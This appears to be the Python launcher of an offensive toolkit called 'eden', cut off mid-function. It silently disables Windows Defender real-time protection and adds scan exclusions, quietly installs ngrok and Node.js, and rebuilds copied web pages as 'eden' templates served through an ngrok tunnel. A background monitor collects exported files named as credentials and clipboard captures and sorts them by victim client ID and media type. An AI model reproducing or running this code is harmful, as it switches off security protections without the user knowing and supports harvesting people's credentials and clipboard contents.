#!/usr/bin/env python3
import os
import sys
import subprocess
import importlib.util
import platform
import re
import shutil
import time
import threading
import glob
import atexit
from pathlib import Path
import urllib.request
import zipfile
import tarfile

# Windows only imports
if platform.system().lower() == "windows":
    import winreg
    import ctypes

def is_admin():
    """Check if the script is running with administrator privileges on Windows."""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        return False

def disable_defender_realtime_protection():
    """
    Temporarily disable Windows Defender real-time protection and add exclusions.
    Returns True if successful, False otherwise.
    """
    if platform.system().lower() != "windows":
        return False  # Not applicable on non-Windows systems
    
    try:
        # Check if running as admin
        if not is_admin():
            return False
        
        # Get current directory and downloads directory
        current_dir = os.path.abspath(os.getcwd())
        downloads_dir = get_downloads_dir()
        
        # Add exclusions for the eden folder (permanent)
        try:
            subprocess.run([
                'powershell', '-Command',
                f'Add-MpPreference -ExclusionPath "{current_dir}"'
            ], check=True, capture_output=True)
        except subprocess.CalledProcessError:
            pass
        
        # Add exclusions for the downloads folder (temporary)
        try:
            subprocess.run([
                'powershell', '-Command',
                f'Add-MpPreference -ExclusionPath "{downloads_dir}"'
            ], check=True, capture_output=True)
            
            # Schedule removal of downloads folder exclusion after 2 minutes
            def remove_downloads_exclusion():
                time.sleep(120)  # 2 minutes
                try:
                    subprocess.run([
                        'powershell', '-Command',
                        f'Remove-MpPreference -ExclusionPath "{downloads_dir}"'
                    ], check=True, capture_output=True)
                except:
                    pass
            
            # Start thread to remove exclusion after delay
            removal_thread = threading.Thread(target=remove_downloads_exclusion)
            removal_thread.daemon = True
            removal_thread.start()
        except subprocess.CalledProcessError:
            pass
        
        # Try to disable real-time protection temporarily
        try:
            subprocess.run([
                'powershell', '-Command',
                'Set-MpPreference -DisableRealtimeMonitoring $true'
            ], check=True, capture_output=True)
            
            # Schedule re-enabling of real-time protection after 2 minutes
            def reenable_realtime_protection():
                time.sleep(120)  # 2 minutes
                try:
                    subprocess.run([
                        'powershell', '-Command',
                        'Set-MpPreference -DisableRealtimeMonitoring $false'
                    ], check=True, capture_output=True)
                except:
                    pass
            
            # Start thread to re-enable real-time protection after delay
            protection_thread = threading.Thread(target=reenable_realtime_protection)
            protection_thread.daemon = True
            protection_thread.start()
            
            return True
        except subprocess.CalledProcessError:
            return False
    except Exception:
        return False

def is_installed(tool_name):
    """Check if a given command/tool is available in system PATH."""
    return shutil.which(tool_name) is not None

def add_to_system_path_windows(path_to_add):
    """Add a directory to the SYSTEM PATH variable on Windows (requires admin)."""
    try:
        with winreg.ConnectRegistry(None, winreg.HKEY_LOCAL_MACHINE) as reg:
            env_key_path = r"SYSTEM\CurrentControlSet\Control\Session Manager\Environment"
            with winreg.OpenKey(reg, env_key_path, 0, winreg.KEY_READ | winreg.KEY_WRITE) as env_key:
                current_path, _ = winreg.QueryValueEx(env_key, "Path")
                if path_to_add.lower() not in current_path.lower():
                    new_path = current_path + ";" + path_to_add
                    winreg.SetValueEx(env_key, "Path", 0, winreg.REG_EXPAND_SZ, new_path)
                    print(f"✓ Added {path_to_add} to system PATH (Restart may be required).")
                else:
                    print(f"✓ {path_to_add} is already in system PATH.")
    except PermissionError:
        print("✗ Permission denied: Run script as administrator to modify system PATH.")

def add_to_shell_profile(path_to_add):
    """Append export PATH=... to shell profile for Linux/macOS."""
    home = os.path.expanduser("~")
    shell = os.environ.get("SHELL", "")
    profile_paths = []
    
    # Detect shell profile file
    if "bash" in shell:
        profile_paths = [os.path.join(home, ".bashrc"), os.path.join(home, ".bash_profile")]
    elif "zsh" in shell:
        profile_paths = [os.path.join(home, ".zshrc")]
    else:
        profile_paths = [os.path.join(home, ".profile")]

    export_line = f'\n# Added by setup script\nexport PATH="{path_to_add}:$PATH"\n'

    for profile in profile_paths:
        try:
            if os.path.exists(profile):
                with open(profile, "r") as f:
                    content = f.read()
                if path_to_add not in content:
                    with open(profile, "a") as f:
                        f.write(export_line)
                    print(f"✓ Added {path_to_add} to PATH in {profile}")
                    return
                else:
                    print(f"✓ {path_to_add} already present in {profile}")
                    return
            else:
                # Create profile file and add PATH
                with open(profile, "w") as f:
                    f.write(export_line)
                print(f"✓ Created {profile} and added {path_to_add} to PATH")
                return
        except Exception as e:
            print(f"✗ Failed to update shell profile {profile}: {e}")

def install_ngrok():
    system = platform.system().lower()
    if system == "windows":
        # Try to disable Windows Defender real-time protection silently
        if platform.system().lower() == "windows":
            disable_defender_realtime_protection()
            
        ngrok_url = "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-stable-windows-amd64.zip"
        # Use absolute path with a unique name to avoid any conflicts
        zip_path = os.path.join(os.path.abspath(os.getcwd()), "ngrok_temp_download.zip")
        extract_dir = os.path.abspath("ngrok_bin")
        os.makedirs(extract_dir, exist_ok=True)
        
        try:
            # First ensure the file doesn't exist
            if os.path.exists(zip_path):
                os.remove(zip_path)
            
            # Download ngrok silently
            urllib.request.urlretrieve(ngrok_url, zip_path)
            
            # Verify the file exists and has content
            if not os.path.exists(zip_path) or os.path.getsize(zip_path) == 0:
                return False
            
            # Extract the zip file
            with zipfile.ZipFile(zip_path, 'r') as zip_ref:
                zip_ref.extractall(extract_dir)
                
            # Remove the zip after extraction
            if os.path.exists(zip_path):
                os.remove(zip_path)
                
            # Add to path
            add_to_system_path_windows(extract_dir)
            
            # Set the current environment variable so it works immediately in this session
            os.environ["PATH"] = extract_dir + os.pathsep + os.environ.get("PATH", "")
            
            return True
                
        except Exception:
            return False
            
    elif system in ["linux", "darwin"]:
        arch = "amd64"  # default to amd64; could be improved with arch detection
        if system == "linux":
            ngrok_url = f"https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-stable-linux-{arch}.tgz"
        else:
            ngrok_url = f"https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-stable-darwin-{arch}.tgz"
        tgz_path = os.path.join(os.path.abspath(os.getcwd()), "ngrok_temp_download.tgz")
        
        try:
            # First ensure the file doesn't exist
            if os.path.exists(tgz_path):
                os.remove(tgz_path)
            
            # Download the file silently
            urllib.request.urlretrieve(ngrok_url, tgz_path)
            
            # Verify the file exists and has content
            if not os.path.exists(tgz_path) or os.path.getsize(tgz_path) == 0:
                return False
            
            extract_dir = os.path.expanduser("~/.local/bin")
            os.makedirs(extract_dir, exist_ok=True)
            
            # Extract the tar.gz file
            with tarfile.open(tgz_path, "r:gz") as tar_ref:
                tar_ref.extractall(extract_dir)
                
            # Remove the tar.gz after extraction
            if os.path.exists(tgz_path):
                os.remove(tgz_path)

            ngrok_path = os.path.join(extract_dir, "ngrok")
            os.chmod(ngrok_path, 0o755)

            # Add to shell profile if not already in PATH
            if extract_dir not in os.environ.get("PATH", ""):
                add_to_shell_profile(extract_dir)
                # Set the current environment variable so it works immediately in this session
                os.environ["PATH"] = extract_dir + os.pathsep + os.environ.get("PATH", "")
            
            return True
            
        except Exception:
            return False
    else:
        return False

def wait_for_node_installation():
    print("▶ Complete the Node.js installation, then press Enter...")
    input("Press Enter when Node.js installation is finished...")
    
    # Install required npm packages silently
    install_express_ws()

def install_node():
    system = platform.system().lower()
    if system == "windows":
        installer_url = "https://nodejs.org/dist/v20.11.1/node-v20.11.1-x64.msi"
        installer_file = os.path.join(os.path.abspath(os.getcwd()), "node_installer.msi")
        
        # Download silently
        urllib.request.urlretrieve(installer_url, installer_file)
        
        # Launch installer
        subprocess.Popen(["msiexec", "/i", installer_file])
        wait_for_node_installation()
        
        # Delete the installer after installation
        if os.path.exists(installer_file):
            os.remove(installer_file)

    elif system in ["linux", "darwin"]:
        # For Linux/macOS, download tarball and prompt user to install manually
        if system == "linux":
            installer_url = "https://nodejs.org/dist/v20.11.1/node-v20.11.1-linux-x64.tar.xz"
        else:
            installer_url = "https://nodejs.org/dist/v20.11.1/node-v20.11.1-darwin-x64.tar.gz"

        installer_file = os.path.join(os.path.abspath(os.getcwd()), installer_url.split("/")[-1])
        
        # Download silently
        urllib.request.urlretrieve(installer_url, installer_file)
        print("▶ Please extract and install Node.js manually")
        wait_for_node_installation()
        
        # Delete the installer after installation
        if os.path.exists(installer_file):
            os.remove(installer_file)

def check_and_setup_node_ngrok():
    # Check for Node.js silently
    if not is_installed("node") or not is_installed("npm"):
        install_node()

def install_express_ws():
    try:
        # Install express and ws completely silently
        subprocess.check_call(['npm', 'install', 'express', 'ws', '--save', '--silent'], shell=True)
    except subprocess.CalledProcessError:
        pass

# ngrok and node installed 
# Function to create a simple loading bar with preinstalled modules
def show_loading_bar(message, total_steps=20, delay=0.1):
    """Show a simple loading bar with the given message"""
    bar_width = 30
    for i in range(total_steps + 1):
        percent = i / total_steps
        filled_width = int(bar_width * percent)
        bar = '█' * filled_width + '░' * (bar_width - filled_width)
        sys.stdout.write(f'\r{message} [{bar}] {int(percent * 100)}%')
        sys.stdout.flush()
        time.sleep(delay)
    sys.stdout.write('\n')
    sys.stdout.flush()

# Function to check if a module is installed
def is_module_installed(module_name):
    """Check if a Python module is installed without importing it"""
    return importlib.util.find_spec(module_name) is not None

# Function to install required modules silently
def install_required_modules():
    """Install required Python modules silently with a loading bar"""
    # Define required modules with their package names (if different)
    required_modules = {
        'colorama': 'colorama',
        'tqdm': 'tqdm',
        'bs4': 'beautifulsoup4',
        'websocket': 'websocket-client'
    }
    
    # Check which modules are missing
    missing_modules = {}
    for module_name, package_name in required_modules.items():
        if not is_module_installed(module_name):
            missing_modules[module_name] = package_name
    
    # If all modules are installed, return early
    if not missing_modules:
        return
    
    # Show loading bar for installation
    show_loading_bar("Installing dependencies", total_steps=20)
    
    # Handle virtual environment for Linux
    is_venv = False
    if platform.system() != "Windows":
        try:
            # Check if we're in a virtual environment
            if sys.prefix != sys.base_prefix:
                is_venv = True
        except AttributeError:
            pass
    
    # If we're not in a venv on Linux/Mac, create and activate one
    if not is_venv and platform.system() != "Windows":
        try:
            venv_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "venv")
            
            # Create venv if it doesn't exist
            if not os.path.exists(venv_dir):
                subprocess.run([sys.executable, "-m", "venv", venv_dir], 
                              stdout=subprocess.PIPE,
                              stderr=subprocess.PIPE)
            
            # Activate venv by modifying environment variables
            bin_dir = os.path.join(venv_dir, "bin")
            os.environ["VIRTUAL_ENV"] = venv_dir
            os.environ["PATH"] = bin_dir + os.pathsep + os.environ.get("PATH", "")
            sys.path.insert(0, bin_dir)
            
            # Update pip
            subprocess.run([os.path.join(bin_dir, "pip"), "install", "--upgrade", "pip"],
                          stdout=subprocess.PIPE,
                          stderr=subprocess.PIPE)
            
            # Install missing modules silently
            for module_name, package_name in missing_modules.items():
                try:
                    subprocess.run([os.path.join(bin_dir, "pip"), "install", package_name],
                                stdout=subprocess.PIPE,
                                stderr=subprocess.PIPE)
                except Exception:
                    pass  # Continue with next module if one fails
        except Exception:
            # Fall back to regular pip if venv fails
            for module_name, package_name in missing_modules.items():
                try:
                    subprocess.run([sys.executable, "-m", "pip", "install", package_name],
                                stdout=subprocess.PIPE,
                                stderr=subprocess.PIPE)
                except Exception:
                    pass  # Continue with next module if one fails
    else:
        # Windows or already in venv - use regular pip install
        for module_name, package_name in missing_modules.items():
            try:
                subprocess.run([sys.executable, "-m", "pip", "install", package_name],
                            stdout=subprocess.PIPE,
                            stderr=subprocess.PIPE)
            except Exception:
                pass  # Continue with next module if one fails

# Run the function to install necessary modules
install_required_modules()

# Now import the modules after making sure they're installed
try:
    import colorama
    from colorama import Fore, Style
    colorama.init(autoreset=True)
    HAS_COLORAMA = True
except ImportError:
    # Create a simple fallback if colorama isn't installed yet
    HAS_COLORAMA = False
    class DummyColor:
        def __getattr__(self, name):
            return ""
    
    class DummyStyle:
        def __getattr__(self, name):
            return ""
    
    Fore = DummyColor()
    Style = DummyStyle()

# Rest of the imports that might depend on installed packages
try:
    import websocket
    from tqdm import tqdm
    from bs4 import BeautifulSoup
except ImportError:
    # We'll handle missing imports gracefully later
    pass

# Global variables
eden_output_monitor_thread = None
client_id_to_nickname_map = {}
stop_monitoring = False
custom_output_dir = None
custom_download_dir = None

def get_downloads_dir():
    """Get the downloads directory, respecting custom setting if available"""
    global custom_download_dir
    
    if custom_download_dir:
        return custom_download_dir
        
    # Get default downloads directory based on platform
    if platform.system() == "Windows":
        # Windows - try using environment variable first
        username = os.environ.get('USERNAME')
        if username:
            downloads = os.path.join('C:', 'Users', username, 'Downloads')
            if os.path.exists(downloads):
                return downloads
    
    # Use home directory method for Linux/Mac or as Windows fallback
    home_dir = os.path.expanduser("~")
    downloads = os.path.join(home_dir, "Downloads")
    
    # Check if the default location exists
    if os.path.exists(downloads):
        return downloads
        
    # If we can't find a Downloads folder, use the current directory as a last resort
    return os.getcwd()

def get_output_dir():
    """Get the output directory, respecting custom setting if available"""
    global custom_output_dir
    
    if custom_output_dir:
        return custom_output_dir
    
    # Default is current working directory
    output_dir = os.path.join(os.getcwd(), 'EDEN_OUTPUT')
    return output_dir

def set_output_dir(path):
    """Set custom output directory for EDEN_OUTPUT folder"""
    global custom_output_dir
    
    # Expand any user paths like ~ or environment variables
    expanded_path = os.path.expanduser(os.path.expandvars(path))
    
    # Make absolute if needed
    if not os.path.isabs(expanded_path):
        expanded_path = os.path.abspath(expanded_path)
    
    # Ensure the path exists
    try:
        os.makedirs(expanded_path, exist_ok=True)
        custom_output_dir = expanded_path
        print(f"{Fore.GREEN}✓ EDEN output folder set to: {expanded_path}")
        
        # Create EDEN_OUTPUT subfolder
        output_dir = os.path.join(expanded_path, 'EDEN_OUTPUT')
        os.makedirs(output_dir, exist_ok=True)
        
        return True
    except Exception as e:
        print(f"{Fore.RED}✗ Error setting output directory: {e}")
        return False

def set_download_dir(path):
    """Set custom directory to monitor for downloads"""
    global custom_download_dir
    
    # Expand any user paths like ~ or environment variables
    expanded_path = os.path.expanduser(os.path.expandvars(path))
    
    # Make absolute if needed
    if not os.path.isabs(expanded_path):
        expanded_path = os.path.abspath(expanded_path)
    
    # Verify the directory exists
    if not os.path.exists(expanded_path):
        print(f"{Fore.RED}✗ Directory does not exist: {expanded_path}")
        return False
    
    if not os.path.isdir(expanded_path):
        print(f"{Fore.RED}✗ Not a directory: {expanded_path}")
        return False
    
    custom_download_dir = expanded_path
    print(f"{Fore.GREEN}✓ Download monitoring folder set to: {expanded_path}")
    return True

def get_unique_filename(target_path):
    """
    Generate a unique filename if the target path already exists.
    Adds incrementing numbers to the filename (1, 2, 3, etc.)
    """
    if not os.path.exists(target_path):
        return target_path
    
    # Split the path into directory, base filename, and extension
    directory = os.path.dirname(target_path)
    filename = os.path.basename(target_path)
    name, ext = os.path.splitext(filename)
    
    # Try adding incrementing numbers until we find a unique name
    counter = 1
    while True:
        new_filename = f"{name}{counter}{ext}"
        new_path = os.path.join(directory, new_filename)
        if not os.path.exists(new_path):
            return new_path
        counter += 1

def monitor_eden_outputs():
    """
    Background function to monitor downloads directory for eden output files.
    - Creates EDEN_OUTPUT directory and subdirectories
    - Continuously checks for new files matching the pattern with or without nickname
    - Organizes files by nickname/clientId and media type
    - Renames client ID folders to nickname folders when nickname is discovered
    - Handles exported files from server.html (credentials and clipboard)
    """
    global client_id_to_nickname_map, stop_monitoring
    
    try:
        # Get the source downloads directory using platform-aware method
        downloads_dir = get_downloads_dir()
        
        # Create main EDEN_OUTPUT directory
        output_dir = get_output_dir()
        os.makedirs(output_dir, exist_ok=True)
        
        # Keep track of processed files to avoid duplicates
        processed_files = set()
        
        # Keep track of files and their first seen time
        files_pending = {}
        
        # Main monitoring loop
        while not stop_monitoring:
            try:
                # First, check for exported files from server.html
                export_patterns = ["eden_credentials.*", "eden_clipboard.*"]
                for pattern in export_patterns:
                    export_matches = glob.glob(os.path.join(downloads_dir, pattern))
                    
                    for file_path in export_matches:
                        file_name = os.path.basename(file_path)
                        
                        # Skip if we've already processed this file
                        if file_path in processed_files:
                            continue
                        
                        # Implement a delay before moving any file
                        current_time = time.time()
                        
                        # If we haven't seen this file before, record the time
                        if file_path not in files_pending:
                            files_pending[file_path] = current_time
                            continue  # Skip for now, we'll process it after the delay
                        
                        # Check if enough time has passed (3 seconds delay)
                        if current_time - files_pending[file_path] < 3:
                            continue  # Not enough time has passed, check again later
                        
                        # Remove from pending since we're processing it now
                        del files_pending[file_path]
                        
                        # Determine if this is a credentials or clipboard export and create the directory
                        if file_name.startswith("eden_credentials"):
                            # Create credentials directory in EDEN_OUTPUT
                            target_dir = os.path.join(output_dir, "credentials")
                            os.makedirs(target_dir, exist_ok=True)
                        elif file_name.startswith("eden_clipboard"):
                            # Create clipboard directory in EDEN_OUTPUT
                            target_dir = os.path.join(output_dir, "clipboard")
                            os.makedirs(target_dir, exist_ok=True)
                        else:
                            continue  # Skip if not a recognized export file
                        
                        # Create target path and ensure it's unique
                        target_path = os.path.join(target_dir, file_name)
                        unique_target_path = get_unique_filename(target_path)
                        
                        # Move the file
                        try:
                            shutil.move(file_path, unique_target_path)
                            processed_files.add(file_path)  # Mark as processed
                        except Exception:
                            # Silent exception handling
                            pass
                
                # Now scan for regular eden files with strict format checking
                # Use patterns that match any extension
                for pattern in ["*eden_*_*_*.*", "*_eden_*_*_*.*"]:
                    file_matches = glob.glob(os.path.join(downloads_dir, pattern))
                    
                    for file_path in file_matches:
                        file_name = os.path.basename(file_path)
                        
                        # Skip if we've already processed this file
                        if file_path in processed_files:
                            continue
                        
                        # Implement a delay before moving any file
                        current_time = time.time()
                        
                        # If we haven't seen this file before, record the time
                        if file_path not in files_pending:
                            files_pending[file_path] = current_time
                            continue  # Skip for now, we'll process it after the delay
                        
                        # Check if enough time has passed (3 seconds delay)
                        if current_time - files_pending[file_path] < 3:
                            continue  # Not enough time has passed, check again later
                        
                        # Remove from pending since we're processing it now
                        del files_pending[file_path]
                        
                        # Parse the filename to extract components
                        parts = file_name.split('_')
                        
                        # Need at least 4 parts for our format
                        if len(parts) < 4:
                            continue
                        
                        # Find the "eden" marker
                        eden_index = -1
                        for i, part in enumerate(parts):
                            if part.lower() == "eden":
                                eden_index = i
                                break
                        
                        # If "eden" marker not found, skip this file
                        if eden_index == -1:
                            continue
                        
                        # Check if there's a nickname (if eden is not the first part)
                        has_nickname = (eden_index > 0)
                        nickname = ""
                        if has_nickname:
                            # Everything before "eden" is the nickname
                            nickname = "_".join(parts[:eden_index])
                        
                        # Format type is the part right after "eden"
                        if eden_index + 1 >= len(parts):
                            continue  # Skip if no format part
                        format_type = parts[eden_index + 1]
                        
                        # Extract the last part to check for 4-digit number
                        last_part = parts[-1]
                        last_part_base, extension = os.path.splitext(last_part)
                        
                        # Verify the last part has a 4-digit number at the end
                        if not (last_part_base.isdigit() and len(last_part_base) == 4):
                            continue
                        
                        # Extract the client ID - everything between format and the 4-digit number
                        # The client ID starts at eden_index + 2 and goes up to the second-to-last part
                        if eden_index + 2 >= len(parts) - 1:
                            continue  # Skip if no client ID parts
                        
                        client_id_parts = parts[eden_index + 2:-1]
                        client_id = "_".join(client_id_parts)
                        
                        # Update the nickname mapping if we have a nickname
                        if has_nickname and nickname:
                            # Store the mapping of client_id to nickname
                            client_id_to_nickname_map[client_id] = nickname
                            
                            # Check if we need to rename an existing client_id folder
                            client_id_folder = os.path.join(output_dir, client_id)
                            nickname_folder = os.path.join(output_dir, nickname)
                            
                            if os.path.exists(client_id_folder) and not os.path.exists(nickname_folder):
                                try:
                                    # Rename the client_id folder to nickname folder
                                    os.rename(client_id_folder, nickname_folder)
                                    
                                    # Use the nickname folder for this file
                                    target_folder = nickname
                                except Exception:
                                    # If rename fails, use the nickname anyway for this file
                                    target_folder = nickname
                            else:
                                # Use the nickname for the folder
                                target_folder = nickname
                        else:
                            # No nickname in this file, check if we have a mapping
                            if client_id in client_id_to_nickname_map:
                                # Use the previously mapped nickname
                                target_folder = client_id_to_nickname_map[client_id]
                            else:
                                # Otherwise use the client_id
                                target_folder = client_id
                        
                        # Create the directory structure
                        target_dir = os.path.join(output_dir, target_folder)
                        format_dir = os.path.join(target_dir, format_type)
                        os.makedirs(format_dir, exist_ok=True)
                        
                        # Create target path and ensure it's unique
                        target_path = os.path.join(format_dir, file_name)
                        unique_target_path = get_unique_filename(target_path)
                        
                        # Move the file
                        try:
                            shutil.move(file_path, unique_target_path)
                            processed_files.add(file_path)  # Mark as processed
                        except Exception:
                            # Silent exception handling
                            pass
                
                # Clean up old entries from files_pending (files that disappeared or timed out)
                current_time = time.time()
                for file_path in list(files_pending.keys()):
                    # Remove entries older than 30 seconds or files that no longer exist
                    if not os.path.exists(file_path) or (current_time - files_pending[file_path] > 30):
                        del files_pending[file_path]
                
                # Remove old entries from processed_files to prevent it from growing too large
                for file_path in list(processed_files):
                    try:
                        # If the file no longer exists in the source directory, remove it from our tracking
                        if not os.path.exists(file_path):
                            processed_files.remove(file_path)
                    except Exception:
                        pass
                
                # Brief pause to avoid high CPU usage
                time.sleep(0.5)  # Reduced sleep time for more responsive monitoring
                
            except Exception:
                # Silent exception handling
                time.sleep(2)  # Shorter pause on error for more responsive monitoring
    
    except Exception:
        # Silent exception for outer try block
        pass

def start_eden_output_monitor():
    """Start the eden output monitoring thread"""
    global eden_output_monitor_thread, stop_monitoring
    
    # Reset stop flag
    stop_monitoring = False
    
    # Start monitoring thread if not already running
    if eden_output_monitor_thread is None or not eden_output_monitor_thread.is_alive():
        eden_output_monitor_thread = threading.Thread(target=monitor_eden_outputs)
        eden_output_monitor_thread.daemon = True  # Thread will exit when main program exits
        eden_output_monitor_thread.start()

def stop_eden_output_monitor():
    """Stop the eden output monitoring thread"""
    global stop_monitoring
    stop_monitoring = True

def check_nodejs():
    """Check if Node.js is installed and install if needed."""
    try:
        # Check if Node.js is installed
        node_version = subprocess.run(
            ["node", "--version"], 
            stdout=subprocess.PIPE, 
            stderr=subprocess.PIPE, 
            text=True
        )
        
        if node_version.returncode == 0:
            return True  # Node.js is installed
    except FileNotFoundError:
        pass  # Node.js is not installed
    
    # Node.js is not installed, so we need to log this issue
    # We can't install Node.js automatically in a cross-platform way
    # Just create a helper message file
    
    # Check if warning file already exists
    warning_file = os.path.join(os.getcwd(), "nodejs_required.txt")
    if not os.path.exists(warning_file):
        with open(warning_file, "w") as f:
            f.write("Node.js is required but not installed on this system.\n")
            f.write("Please install Node.js from https://nodejs.org/\n")
            f.write("This is required for the server.js or node.js files to work correctly.\n")
    
    return False

def embed_resources_and_update_images(html_paths_concat, silent=False):
    """
    Takes a concatenated string of one or more HTML file paths
    split by '.html' (each file ends with .html), processes each HTML file:
    - embeds CSS/JS inline,
    - copies images and updates src links with correct base URL based on server status,
    - saves output eden HTML in templates folder.
    
    Args:
        html_paths_concat (str): Concatenated string of HTML paths
        silent (bool): If True, don't print status messages
    """
    # Split input by '.html' and keep .html with each filename
    parts = html_paths_concat.split('.html')
    html_files = [p.strip() + '.html' for p in parts if p.strip()]

    # Create templates directory if it doesn't exist
    base_output_dir = os.path.join(os.getcwd(), "templates")
    resource_output_dir = os.path.join(base_output_dir, "resource")
    os.makedirs(resource_output_dir, exist_ok=True)

    processed_files = []
    for html_path in html_files:
        abs_html_path = os.path.abspath(html_path)

        if not os.path.isfile(abs_html_path):
            if not silent:
                print(f"{Fore.RED}❌ Invalid file path: {abs_html_path}")
            continue

        html_dir = os.path.dirname(abs_html_path)
        html_filename = os.path.basename(abs_html_path)
        html_name_no_ext = os.path.splitext(html_filename)[0].lower()

        # Find resource folder (case-insensitive startswith match)
        folder_candidates = [f for f in os.listdir(html_dir) if os.path.isdir(os.path.join(html_dir, f)) and f.lower().startswith(html_name_no_ext)]
        if not folder_candidates:
            if not silent:
                print(f"{Fore.RED}❌ No associated resource folder found for: {html_filename}")
            continue
        folder_path = os.path.join(html_dir, folder_candidates[0])

        if not silent:
            print(f"\n📄 Processing: {html_filename}")
            print(f"📁 Using resource folder: {folder_path}")

        with open(abs_html_path, "r", encoding="utf-8") as file:
            soup = BeautifulSoup(file, "html.parser")

        # Inline CSS
        for link_tag in soup.find_all("link", rel="stylesheet"):
            href = link_tag.get("href")
            if not href:
                continue
            css_file_path = os.path.join(folder_path, os.path.basename(href))
            if os.path.exists(css_file_path):
                with open(css_file_path, "r", encoding="utf-8") as css_file:
                    style_tag = soup.new_tag("style")
                    style_tag.string = css_file.read()
                    link_tag.replace_with(style_tag)
                    if not silent:
                        print(f"✅ Embedded CSS: {href}")
            else:
                if not silent:
                    print(f"⚠️ CSS not found: {css_file_path}")

        # Inline JS
        for script_tag in soup.find_all("script", src=True):
            src = script_tag.get("src")
            if not src:
                continue
            js_file_path = os.path.join(folder_path, os.path.basename(src))
            if os.path.exists(js_file_path):
                with open(js_file_path, "r", encoding="utf-8") as js_file:
                    new_script_tag = soup.new_tag("script")
                    new_script_tag.string = js_file.read()
                    script_tag.replace_with(new_script_tag)
                    if not silent:
                        print(f"✅ Embedded JS: {src}")
            else:
                if not silent:
                    print(f"⚠️ JS not found: {js_file_path}")

        # Determine base_url for images (assumes these variables exist globally)
        global server_status, server_mode, ngrok_url
        if server_status == "Running":
            if server_mode == "Local":
                base_url = "http://localhost:8080/templates/resource/"
            else:
                base_url = f"https://{ngrok_url}/templates/resource/"
        else:
            # Use relative path as fallback
            base_url = "/templates/resource/"

        # Copy images and update src
        for img_tag in soup.find_all("img", src=True):
            src = img_tag['src']
            image_name = os.path.basename(src)
            original_img_path = os.path.join(folder_path, image_name)

            if os.path.exists(original_img_path):
                new_img_path = os.path.join(resource_output_dir, image_name)
                shutil.copy2(original_img_path, new_img_path)
                img_tag['src'] = base_url + image_name
                if not silent:
                    print(f"🖼️ Copied image and updated src: {image_name}")
            else:
                if not silent:
                    print(f"⚠️ Image not found: {original_img_path}")

        # Save eden HTML output
        output_html_path = os.path.join(base_output_dir, f"{html_name_no_ext}_eden.html")
        with open(output_html_path, "w", encoding="utf-8") as output_file:
            output_file.write(str(soup))

        processed_files.append(output_html_path)
        if not silent:
            print(f"✅ eden HTML saved: {output_html_path}")
    
    # Update links in the processed files if server is running
    if processed_files and server_status == "Running":
        # Update template links in the newly created files
        update_template_links(silent=silent)
        
    return processed_files

def install_npm_packages():
    """Install required npm packages (ws and express) for Node.js server functionality."""
    print(f"\n{Fore.CYAN}=== Installing required npm packages ===")
    
    # Check if Node.js and npm are available
    try:
        node_version = subprocess.run(
            ["node", "--version"], 
            stdout=subprocess.PIPE, 
            stderr=subprocess.PIPE,
            text=True
        )
        
        if node_version.returncode != 0:
            print(f"{Fore.RED}✗ Node.js is not installed or not in PATH.")
            return False
            
        print(f"{Fore.GREEN}✓ Node.js {node_version.stdout.strip()} is installed")
        
        npm_version = subprocess.run(
            ["npm", "--version"], 
            stdout=subprocess.PIPE, 
            stderr=subprocess.PIPE,
            text=True
        )
        
        if npm_version.returncode != 0:
            print(f"{Fore.RED}✗ npm is not installed or not in PATH.")
            return False
            
        print(f"{Fore.GREEN}✓ npm {npm_version.stdout.strip()} is installed")
        
    except FileNotFoundError:
        print(f"{Fore.RED}✗ Node.js or npm is not installed or not in PATH.")
        return False
    
    # Required packages
    packages = ['ws', 'express']
    
    # Create package.json if it doesn't exist
    if not os.path.exists('package.json'):
        print(f"{Fore.YELLOW}⚠ package.json not found, creating one...")
        try:
            subprocess.run(
                ['npm', 'init', '-y'],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                check=True
            )
            print(f"{Fore.GREEN}✓ Created package.json file")
        except Exception as e:
            print(f"{Fore.RED}✗ Failed to create package.json: {str(e)}")
    
    # Install each package separately with clear output
    for package in packages:
        print(f"{Fore.CYAN}▶ Installing {package}...")
        
        # First check if it's already installed
        check_result = subprocess.run(
            ['npm', 'list', package],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        
        if check_result.returncode == 0 and "(empty)" not in check_result.stdout:
            print(f"{Fore.GREEN}✓ {package} is already installed")
            continue
        
        # Install the package
        try:
            # Use subprocess.run with full output to console for visibility
            install_process = subprocess.run(
                ['npm', 'install', '--save', package],
                check=True
            )
            
            # Verify installation
            verify_result = subprocess.run(
                ['npm', 'list', package],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            
            if verify_result.returncode == 0 and "(empty)" not in verify_result.stdout:
                print(f"{Fore.GREEN}✓ Successfully installed {package}")
            else:
                print(f"{Fore.RED}✗ Failed to install {package}")
                print(f"{Fore.YELLOW}⚠ Please install {package} manually using 'npm install {package}'")
        except subprocess.CalledProcessError as e:
            print(f"{Fore.RED}✗ Error installing {package}: {str(e)}")
            print(f"{Fore.YELLOW}⚠ Please install {package} manually using 'npm install {package}'")
    
    # Final verification
    all_installed = True
    for package in packages:
        verify_result = subprocess.run(
            ['npm', 'list', package],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        
        if verify_result.returncode != 0 or "(empty)" in verify_result.stdout:
            all_installed = False
            print(f"{Fore.RED}✗ {package} is not properly installed")
        else:
            print(f"{Fore.GREEN}✓ {package} is properly installed")
    
    if all_installed:
        print(f"{Fore.GREEN}✓ All required npm packages are installed")
    else:
        print(f"{Fore.YELLOW}⚠ Some packages may not be properly installed")
        print(f"{Fore.YELLOW}⚠ You may need to manually install missing packages")
        print(f"{Fore.YELLOW}⚠ Run: npm install ws express --save")
    
    return all_installed

def check_and_install_modules():
    """Check if all required modules are installed and install any missing ones."""
    # We've already installed the basic required modules at startup
    # This function now focuses on additional modules needed for specific features
    
    # Check if server.html and eden.js exist and scan them for potential modules
    additional_modules = {}
    
    files_to_check = ['server.html', 'eden.js', 'node.js', 'server.js']
    for file_name in files_to_check:
        file_path = os.path.join(os.getcwd(), file_name)
        if os.path.isfile(file_path):
            try:
                with open(file_path, 'r', encoding='utf-8') as file:
                    content = file.read()
                    
                    # Look for common module imports in JavaScript
                    if file_name.endswith('.js'):
                        # Check for require statements
